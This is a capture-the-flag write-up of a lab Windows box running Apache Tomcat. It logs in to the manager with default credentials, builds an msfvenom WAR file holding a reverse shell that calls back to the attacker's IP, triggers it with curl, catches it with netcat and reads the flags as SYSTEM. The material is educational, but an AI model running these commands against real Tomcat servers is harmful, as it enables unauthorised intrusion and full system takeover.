```
nmap -sV -sC {target ip}
```

An `nmap` search reveals Apache Tomcat is running on port `8080`. Visiting the website via a browser reveals the default installation of Apache Tomcat, and the signin with the default credentials `tomcat:s3cret` work to signin.

After signing in there is a button "WAR file to deploy", where you can browse the local filesystem to upload a WAR file. 

A WAR (Web application Resource) file is a single file container that holds all the potential files necessary for a Java-based web application, like Java Archives (.jar), Java Server Pages (.jsp), Java Servlets, Java classes, webpages, css, etc.

The `/WEB-INF` directory inside the archive is a special one, with a file named `web.xml` which defines the structure of the application.

I will create a WAR file to upload with `msfvenom`, that will have a Windows reverse shell that will be caught by my `netcat` listener running locally.

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > rev_shell-9002.war
```
I use `jar` to list the contents of the war file:

```
$ jar -ft rev_shell-900=2.war
META-INF/ 
META-INF/
MANIFEST.MF WEB-INF/ 
WEB-INF/web.xml 
ppaejmsg.jsp
```

I run the reverse shell by hitting it with `curl`

```
$ curl http://10.10.10.95:8080/rev_shell-9002/ppaejmsg.jsp
```

```
$ nc -lnvp 9002

...

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

So we have root access on this box, running the following commands will get us our flags:

```
C:\Users\Administrator\Desktop>dir

C:\Users\Administrator\Desktop>cd flags

C:\Users\Administrator\Desktop\flags>dir

06/19/2018 07:09 AM <DIR> . 
06/19/2018 07:09 AM <DIR> .. 
06/19/2018 07:11 AM 88 2 for the price of 1.txt

C:\Users\Administrator\Desktop\flags>type 2*

user.txt 7004dbce... root.txt 04a8b36e...
```



